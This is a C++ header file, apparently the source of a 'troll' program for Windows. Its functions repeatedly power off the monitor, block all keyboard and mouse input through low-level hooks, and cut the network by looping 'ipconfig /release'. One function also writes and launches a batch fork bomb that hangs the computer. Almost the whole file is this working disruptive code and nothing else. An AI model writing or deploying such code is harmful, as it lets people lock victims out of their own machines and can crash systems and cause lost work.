/*
TROLL:
block entire screen [ok]
block input [ok]
play sound
turn off internet [ok]
spawn a process which kills the entire computer [ok]
*/

#include <iostream>
#include <windows.h>
#include <iphlpapi.h>
#include <powrprof.h>
#include <fstream>

#pragma once

void block_screen(int seconds)
{
    for (int i = 0; i != seconds; i++)
    {
        PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        Sleep(1000);
    }
}

LRESULT CALLBACK block_proc(int _, WPARAM __, LPARAM ___)
{
    return 1;
}

void block_input(int seconds)
{
    HHOOK keyboard_hook;
    HHOOK mouse_hook;
    for (int i = 0; i != seconds * 10; i++)
    {
        keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, block_proc, NULL, 0);
        mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, block_proc, NULL, 0);
        Sleep(100);
        UnhookWindowsHookEx(keyboard_hook);
        UnhookWindowsHookEx(mouse_hook);
    }
}

void kill_internet(int seconds)
{
    for (int i = 0; i != seconds * 10; i++) {
        system("ipconfig /release");
        Sleep(100);
    }
    system("ipconfig /renew");
}

void kill_computer()
{
    std::ofstream w("g.bat");
    w << "%0|%0";
    w.close();
    system("g.bat");
}